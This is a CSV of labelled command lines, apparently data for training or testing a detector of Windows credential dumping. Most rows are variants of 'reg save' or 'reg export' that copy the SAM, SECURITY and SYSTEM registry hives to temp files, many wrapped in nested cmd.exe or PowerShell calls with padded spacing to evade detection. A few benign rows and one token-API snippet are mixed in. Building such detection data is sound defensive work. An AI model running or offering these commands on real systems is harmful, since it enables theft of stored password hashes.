text,label
reg   export   hklm\system   c:\windows\temp\4qp3u4vt.save,1
reg save hklm\sam c:\windows\temp\pl03s4j9.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\c6xiy1c5.save""",1
reg save hklm\security c:\windows\temp\53gtnmm5.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\0e8hh95i.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\3jwi5blx.dat""",1
reg save hklm\system c:\windows\temp\2z54cxy5.save,1
reg export hklm\sam c:\windows\temp\xdjgkucu.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\x9pf9uq1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\kf4efvvc.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\4nbtnbvs.dat""""",1
reg export hklm\sam c:\windows\temp\sbdlxq86.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\fxdafzmo.dat""",1
reg export hklm\security c:\windows\temp\wecgv0ev.save,1
reg save hklm\security c:\windows\temp\rr3ummm3.save,1
reg save hklm\sam c:\windows\temp\65hatkcy.save,1
reg export hklm\security c:\windows\temp\c7gwi2h2.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\3n2wizhg.dat""",1
reg save hklm\system c:\windows\temp\ellzg22s.save,1
reg save hklm\sam c:\windows\temp\fgjjy1uy.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\fkl7uyuj.dat""",1
reg   save   hklm\sam   c:\windows\temp\rosebzqu.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\j40xw6n4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\4csgrrwu.dat""",1
reg export hklm\security c:\windows\temp\c6srf0ew.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\mg78gtpj.dat""""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\y1d24b8i.dat""",1
reg export hklm\system c:\windows\temp\96ecejjs.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\1wghsdtg.dat""",1
reg export hklm\security c:\windows\temp\s9zz6kt5.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\ov1lmzpc.save""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\pkw3es7s.save""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\5gl8v45w.save""",1
reg export hklm\sam c:\windows\temp\hx34gqq3.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\vckhryy7.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\rc7xi85e.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\vdl5728w.dat""",1
reg export hklm\sam c:\windows\temp\g82jqwqe.save,1
reg save hklm\security c:\windows\temp\659e41ue.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\rb5cfjhf.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\pi7524bc.dat""",1
reg save hklm\security c:\windows\temp\syjwo5fk.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\xzh05ll1.dat""",1
reg   save   hklm\security   c:\windows\temp\s5pv60cz.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\14wu027r.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\br61jf8n.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\m4m4mpec.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ywb1cmjn.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\arukbq58.dat""",1
reg   export   hklm\sam   c:\windows\temp\oxkuwr80.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\bmxenqh4.dat""",1
reg export hklm\sam c:\windows\temp\vv2wjvg2.save,1
reg export hklm\security c:\windows\temp\hojb595j.save,1
reg export hklm\system c:\windows\temp\1n6p5jxs.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\6lfpdyh5.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\sp5q4txi.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\6g2f3153.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\3lv17muo.dat""",1
reg save hklm\security c:\windows\temp\mnk937gp.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\sp9susmh.dat""",1
reg save hklm\sam c:\windows\temp\z4326epm.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\gw2n1760.dat""",1
reg save hklm\sam c:\windows\temp\044c6gkq.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\u2awzvkz.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\932ymkzl.dat""",1
reg save hklm\system c:\windows\temp\8vdjuh2b.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\i6mlnaep.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\lvt0rzh1.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\denmt6ji.dat""",1
reg export hklm\security c:\windows\temp\vfzdfj86.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\8w8srd5v.dat""""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\m0sylgac.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\58a2ugtd.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\z9k8u7a2.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\6km97hdx.dat""",1
reg save hklm\system c:\windows\temp\fr2pr0yb.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\7cu51jj1.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\0orp83ju.dat""",1
reg export hklm\sam c:\windows\temp\y5ah8e93.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\oann0v5r.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\gcfwl4mk.dat""""",1
reg export hklm\security c:\windows\temp\ouasn0hw.save,1
reg export hklm\system c:\windows\temp\rukhaetq.save,1
reg export hklm\sam c:\windows\temp\5fgbuya8.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ikh5afzq.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\9k0q7hja.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\cv7flneu.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\a7118old.save""",1
reg export hklm\system c:\windows\temp\3og5fw2h.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\yt2f5fw3.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ymqx0pzq.dat""",1
reg save hklm\system c:\windows\temp\b52lwcco.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\l8qokba4.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\twjymz6i.dat""",1
reg  save  hklm\security  c:\windows\temp\ypzdwowb.save,1
reg export hklm\system c:\windows\temp\qpduk0vf.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\jofx3ypl.dat""",1
reg export hklm\security c:\windows\temp\algn50re.save,1
reg export hklm\security c:\windows\temp\r867234k.save,1
reg save hklm\security c:\windows\temp\w6ap5j8s.save,1
reg export hklm\security c:\windows\temp\ctyh7aq7.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\5b0xx4gu.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ls6p1aui.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\i3pqowaj.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\taqzz1dz.dat""",1
reg   export   hklm\security   c:\windows\temp\g65p9kyq.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\glnx8ff3.dat""",1
reg save hklm\system c:\windows\temp\is23j57a.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\t5mwunkx.dat""",1
reg save hklm\system c:\windows\temp\gwvp9qir.save,1
reg save hklm\system c:\windows\temp\3ag9idd7.save,1
reg save hklm\security c:\windows\temp\ro7cy7q2.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ck53c7sx.dat""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\2u4sweqh.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\phwjgm1q.dat""",1
reg   export   hklm\sam   c:\windows\temp\00ln2lkb.save,1
reg  export  hklm\sam  c:\windows\temp\vdkdhlb1.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\t7x6he69.save""",1
reg save hklm\system c:\windows\temp\aje7g73w.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\jr69eysa.dat""",1
reg save hklm\security c:\windows\temp\u959bqro.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\drxsj999.dat""",1
reg export hklm\security c:\windows\temp\29pf60ff.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\hj6dh8wi.save""",1
reg export hklm\security c:\windows\temp\ive5wdf5.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\dxd2ci0z.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ba991r91.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\f68fh3wo.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\n3icno5l.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\kcc62q9i.dat""",1
reg export hklm\system c:\windows\temp\gd1t21ok.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\7ivm4j4b.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\wrqxfjz6.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\uae8t653.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rfrm8sjl.dat""",1
reg export hklm\security c:\windows\temp\v36crnnz.save,1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\nt2yfny6.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8r2drux0.dat""",1
reg export hklm\sam c:\windows\temp\i9erdhqh.save,1
reg export hklm\sam c:\windows\temp\mshjxmwh.save,1
reg save hklm\sam c:\windows\temp\comywth3.save,1
reg save hklm\security c:\windows\temp\pc97hy1a.save,1
reg export hklm\security c:\windows\temp\1rl6v71i.save,1
reg export hklm\system c:\windows\temp\qq7wp6ln.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\d3kgl4nv.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\kesq7u64.dat""",1
reg save hklm\system c:\windows\temp\3opbbbny.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\q8upohxa.dat""",1
reg save hklm\system c:\windows\temp\d51pwbkj.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3tg6h86v.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1d1es3x2.dat""",1
reg export hklm\security c:\windows\temp\uvt43j3a.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\o0d3i7h8.dat""",1
reg  export  hklm\sam  c:\windows\temp\tv253gr7.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\e6j36knz.dat""",1
reg export hklm\sam c:\windows\temp\07s10w3g.save,1
reg save hklm\sam c:\windows\temp\ayjpj7b3.save,1
reg save hklm\sam c:\windows\temp\8nb9l113.save,1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\4uqvmd14.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\o5io8u6o.dat""",1
reg export hklm\security c:\windows\temp\yb3gbbbc.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\swucuhh6.save""",1
"cmd.exe /c ""backup-utility   write   hklm\software   to   c:\backups\config.dat""",0
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\3oxio2hp.dat""",1
reg  save  hklm\system  c:\windows\temp\xd914q5o.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\gteb0haq.dat""",1
reg export hklm\security c:\windows\temp\c4aubcwu.save,1
reg save hklm\security c:\windows\temp\3sdrw99t.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4t216vxv.dat""",1
reg save hklm\sam c:\windows\temp\ah2o9pje.save,1
reg export hklm\system c:\windows\temp\3tbgv1ge.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\craahmij.dat""",1
reg export hklm\system c:\windows\temp\bwq77ggs.save,1
reg save hklm\sam c:\windows\temp\1armw3k9.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\sm7tcm9i.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\34r3vxjh.dat""",1
reg save hklm\system c:\windows\temp\5bsc2zqr.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\9ypey0qr.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\fmnj0124.dat""",1
reg save hklm\sam c:\windows\temp\2m8odpnn.save,1
reg save hklm\security c:\windows\temp\ofn8be7j.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\5vaxh4jj.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\la5jvt2p.dat""",1
reg save hklm\security c:\windows\temp\a0ltkjun.save,1
reg export hklm\system c:\windows\temp\qf72zs7x.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\m32s8nfn.dat""",1
reg export hklm\sam c:\windows\temp\z06b3vuf.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\50avuz29.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\diqtrej6.dat""",1
reg   export   hklm\system   c:\windows\temp\6hndenwa.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\qj2y11h1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\y2zeuiyb.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\mc2lzha2.dat""""",1
reg export hklm\system c:\windows\temp\5jfz8ane.save,1
reg   save   hklm\security   c:\windows\temp\75q4h921.save,1
reg save hklm\security c:\windows\temp\mw7woop1.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\bml6kxex.dat""",1
reg export hklm\security c:\windows\temp\rco3raxq.save,1
reg export hklm\system c:\windows\temp\qjap7u8x.save,1
reg save hklm\system c:\windows\temp\jdtamvi5.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\a0mxplzw.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\zpjh7pw5.dat""""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\evlx3e4t.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\6rk79bl8.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\oj6qrqdl.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\w1ovifro.dat""",1
reg export hklm\system c:\windows\temp\hivbrwbh.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\0lw5s2yo.dat""",1
reg  save  hklm\system  c:\windows\temp\y0rxyj4w.save,1
reg export hklm\sam c:\windows\temp\wuqaeznb.save,1
reg export hklm\sam c:\windows\temp\5v3dv19x.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\vn523vou.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\57qnsvys.dat""",1
reg save hklm\sam c:\windows\temp\1jmjupf1.save,1
reg export hklm\security c:\windows\temp\4isx70ai.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\cn10wsla.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\qr99616d.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\492hgqqi.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\m1xdg8sh.dat""",1
reg save hklm\sam c:\windows\temp\nx5uqm1b.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\3cch1jq3.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\heuvhszr.dat""",1
reg export hklm\system c:\windows\temp\8m1zs229.save,1
reg   export   hklm\security   c:\windows\temp\f0y9wbuo.save,1
reg export hklm\security c:\windows\temp\7xbghbcc.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\e4hn6v88.save""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\riqxyfkq.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\l49jhzg8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\iyvi910y.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\hchqd2lv.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\3xd7irlf.dat""",1
reg   save   hklm\sam   c:\windows\temp\cilu4r0w.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\s5buee95.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\zq71cb5l.dat""",1
reg save hklm\system c:\windows\temp\pk9yvgvn.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\l1tnh8w4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\myvnue58.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\400v7xml.dat""",1
ipconfig  /all,0
reg  export  hklm\security  c:\windows\temp\vlo7f41e.save,1
reg export hklm\system c:\windows\temp\2r82ueag.save,1
reg export hklm\security c:\windows\temp\veub0oqr.save,1
reg   save   hklm\sam   c:\windows\temp\9ysfppi8.save,1
reg save hklm\security c:\windows\temp\j4wgrijm.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ntpyamse.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\9wchqhhi.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\hq9nnmjx.dat""""",1
reg save hklm\sam c:\windows\temp\ditltqrq.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
reg save hklm\security c:\windows\temp\plf7987a.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ge2bjfop.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\7gcxx97n.dat""",1
reg save hklm\security c:\windows\temp\gllvehjw.save,1
reg export hklm\system c:\windows\temp\64xlnqyl.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\jv4bikw8.dat""",1
reg export hklm\sam c:\windows\temp\nlkox8c5.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\azz6j4xk.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zegn1xzj.dat""",1
reg export hklm\security c:\windows\temp\x7l07nir.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\3fc7wgt4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\iai2r6gx.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\0tb822jb.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\662m22f8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\f6x45yk2.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\9fuywopy.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\uaqdlyp4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\zxtpn0bu.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\4q05nnv1.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ewpqgvtd.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\izimszfv.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\22w3w6u1.dat""",1
reg export hklm\system c:\windows\temp\8v46th2u.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\b0riv3um.save""",1
reg export hklm\security c:\windows\temp\vf95ri5b.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\kfqv2fm2.dat""",1
reg save hklm\security c:\windows\temp\mzyuh159.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\6kzketfz.save""",1
reg save hklm\security c:\windows\temp\b7gv7r7w.save,1
reg save hklm\sam c:\windows\temp\ilis5t6o.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\nhfc7l42.dat""",1
reg export hklm\security c:\windows\temp\1jnna83e.save,1
reg save hklm\security c:\windows\temp\2oxt1kas.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\i6etrqjd.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\h1anm9un.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\dgqnd3h1.dat""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\8euxqizd.save""",1
reg export hklm\sam c:\windows\temp\vhwvhupi.save,1
reg export hklm\sam c:\windows\temp\cxae9fdi.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0t1fufpa.dat""",1
reg export hklm\sam c:\windows\temp\hzs1uk5t.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\5n8sijkx.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\6p3iu5oy.dat""",1
reg export hklm\security c:\windows\temp\ru75f38z.save,1
reg export hklm\security c:\windows\temp\kdyal17d.save,1
reg  save  hklm\sam  c:\windows\temp\3755zvmk.save,1
reg export hklm\security c:\windows\temp\9r8iggyj.save,1
reg export hklm\security c:\windows\temp\wiqhcac3.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\td4ecvez.dat""",1
reg save hklm\security c:\windows\temp\gf0tm5zb.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\bvh1cfks.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\g1gefv8h.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hjek7mgj.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\a8ajxh7c.dat""",1
reg export hklm\sam c:\windows\temp\kaqszabl.save,1
reg save hklm\system c:\windows\temp\kdwr9hgh.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\p7rxl8f9.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\t3rgb0ke.dat""",1
reg save hklm\system c:\windows\temp\tm5vhc43.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0wsf184t.dat""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\uqvmo6ly.save""",1
reg export hklm\security c:\windows\temp\ynoivaqz.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\za9avs7k.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\7kn62qp8.dat""",1
reg export hklm\sam c:\windows\temp\gk9jrf8z.save,1
reg save hklm\system c:\windows\temp\nafq4dim.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ts9fnkgm.dat""",1
